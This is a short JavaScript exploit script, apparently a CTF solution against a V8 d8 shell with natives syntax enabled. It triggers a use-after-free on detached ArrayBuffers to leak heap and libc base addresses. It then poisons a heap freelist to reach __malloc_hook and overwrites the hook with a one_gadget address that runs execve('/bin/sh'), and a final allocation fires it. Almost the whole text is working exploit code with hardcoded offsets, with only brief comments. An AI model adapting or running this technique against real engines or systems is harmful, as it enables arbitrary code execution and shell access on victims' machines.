// glibc heap :(
const buffer = new ArrayBuffer(0x4000);
const buffer_2 = new ArrayBuffer(0x4000);
const uint64 = new BigUint64Array(buffer);
const uint64_2 = new BigUint64Array(buffer_2);
%ArrayBufferDetach(buffer_2); // Free(buffer_2)
uint64.set(uint64_2, 0) // Read After Free
const heap_base = uint64[0] - 0x2c3d0n
const libc_base = uint64[1] - 0x3EBCA0n
// console.log("heap_base: 0x" + heap_base.toString(16));
// console.log("libc_base: 0x" + libc_base.toString(16));
const malloc_hook = libc_base + 0x3ebc30n;

let size = 0x68 ;
for(i=0; i<10; i++){
    %ArrayBufferDetach(new ArrayBuffer(size)); // Fill tcache
}
const ab_1 = new ArrayBuffer(size);
const ab_2 = new ArrayBuffer(size);
const u_1 = new BigUint64Array(ab_1); 
const u_2 = new BigUint64Array(ab_2);
%ArrayBufferDetach(ab_2);
u_1[0] = malloc_hook-0x23n;
u_2.set(u_1, 0); // small bin's fd -> malloc_hook-0x23
const ab_3 = new ArrayBuffer(size); 
const ab_4 = new ArrayBuffer(size);
const u_3= new BigUint64Array(ab_4); // malloc_hook - 0x23!
// 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
// constraints:
//   rsp & 0xf == 0
//   rcx == NULL

// 0x4f322 execve("/bin/sh", rsp+0x40, environ)
// constraints:
//   [rsp+0x40] == NULL

// 0x10a38c execve("/bin/sh", rsp+0x70, environ)
// constraints:
//   [rsp+0x70] == NULL
one_gadget = libc_base + 0x10a38cn;
u_3[2] = one_gadget << 24n;
u_3[3] = one_gadget >> 40n; // overwrite one_gadget
new ArrayBuffer(0xdeadbeef);